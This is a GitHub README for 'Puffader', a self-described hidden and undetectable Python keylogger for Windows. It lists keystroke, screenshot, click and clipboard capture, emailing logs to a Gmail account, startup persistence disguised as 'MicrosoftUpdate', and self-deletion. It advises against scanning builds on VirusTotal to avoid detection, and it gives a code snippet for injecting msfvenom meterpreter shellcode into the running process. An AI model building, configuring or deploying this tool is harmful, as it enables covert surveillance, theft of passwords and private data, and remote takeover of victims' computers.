[![Build status](https://ci.appveyor.com/api/projects/status/5tc6085mmmw6rym8?svg=true)](https://ci.appveyor.com/project/xp4xbox/puffader)
# Puffader

**Python 2.7 is obsolete so this project isn't really supported anymore please use https://github.com/xp4xbox/Python-Keylogger**

Puffader is an opensource, hidden and undetectable keylogger for windows written in Python 2.7 which can also capture screenshots, mouse window clicks and clipboard data.

## Installation
Puffader Requires 32 bit versions of:
* [Python 2.7](https://www.python.org/downloads)
* [Pyhook](https://sourceforge.net/projects/pyhook/files/pyhook/1.5.1/)
* [Pywin32](https://sourceforge.net/projects/pywin32/files/pywin32/)
* [PyScreeze](https://pypi.org/project/PyScreeze/)
* [Py2Exe](https://sourceforge.net/projects/py2exe/files/py2exe/0.6.9/)

1. Download the repository using github or git eg.```git clone https://github.com/xp4xbox/Puffader```
2. Install the modules by running `python -m pip install -r requirements.txt`

Please refer to the [wiki](https://github.com/xp4xbox/Puffader/wiki/Installing-Prerequisites) for more information on installing prerequisites.

## Features
Currently Puffader has several features such as:
* Ability to send logs to any gmail account.
* Ability to capture screenshots
* Ability to store logs locally
* Ability to configure log size before sending
* Ability to send logs at timed intervals
* Ability to stop the program via ctrl-rshift-lshift-h.
* Ability to log special characters.
* Ability to embed an undetectable meterpreter shell
* Ability to capture window mouse clicks
* Ability to run at startup
* Ability to capture clipboard data
* Ability to melt file on execution
* Checking for multiple instances
* And more...

## Quick Usage

1. Open file with idle or any other editor.
2. Modifiy lines `18-37` for your personal preference: eg.
```
strEmailAc = "email@gmail.com"
strEmailPass = "pass"

intCharPerSend = 1000

blnUseTime = "False"
intTimePerSend = 120

blnStoreLocal = "True"
strLogFile = "c:/temp/test.txt"

blnScrShot = "True"
strScrDir = "c:/temp"
intScrTime = 120

blnLogClick = "True"
blnAddToStartup = "False"

blnLogClipboard = "False"
blnMelt = "False"
```
> NOTE: For `strScrDir`, be sure to leave out the last `/`.

#### You can only choose one method for storing/sending logs, default is by email.

#### If you plan to send messages via email, be sure to [allow access for less secure apps](https://myaccount.google.com/lesssecureapps) in your gmail account.

#### If you ever set the program to run at startup and want to remove it, open regedit and navigate to `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` and delete the value `MicrosoftUpdate`.

For more information please refer to the [wiki](https://github.com/xp4xbox/Puffader/wiki/Usage).

### Compiling Program To .exe

> NOTE: Never scan compiled .exe's with Virus Total, NoDistribute or any other online public scan sites.

#### Py2Exe
1. **(Optional)** Add this code to Puffader.py `sys.stderr = None` after the import statements to ensure no errors will show.
3. Make sure the program is called Puffader.py in your python folder as well.
4. Run `python setup.py`
5. You should see the .exe in the dist folder.

Or refer to the [wiki](https://github.com/xp4xbox/Puffader/wiki/Compiling-To-.exe) for more information.

## Adding Meterpreter Plugin

1. Generate raw shellcode using msfvenom (eg. xr8\x02...).
2. Encode the shellcode to base64 by using [this](https://github.com/xp4xbox/Puffader/blob/master/Meterpreter_Plugin/base64encoder.py).
3. Move the [code_injector module](https://github.com/xp4xbox/Puffader/blob/master/Meterpreter_Plugin/code_injector.py) to same dir as the program.
4. Paste in this code after the function to prevent multiple instances as [here](https://github.com/xp4xbox/Puffader/blob/master/Meterpreter_Plugin/Puffader_Code_Addition.py). Setting b64shellcode to be your encrypted shellcode.
```
import code_injector, base64
# base64 shellcode
b64shellcode = ""
shellcode = base64.b64decode(b64shellcode)  # decrypt shellcode
pid = os.getpid()  # get current pid

code_injector.InjectShellCode(pid, shellcode)  # inject the shellcode into the program
```
5. Build program with Py2Exe.

> Check my other project [PyEvade](https://github.com/xp4xbox/PyEvade) for more info on how this works.

## Help

If you need any help at all, feel free to post a "help" issue.

## Contributing

Contributing is encouraged and will help make a better program. Please refer to [this](https://gist.github.com/MarcDiethelm/7303312) before contributing.

## Disclaimer

This program must be used for legal purposes! I am not responsible for anything you do with it.

## License
[License](https://github.com/xp4xbox/Puffader/blob/master/LICENSE)
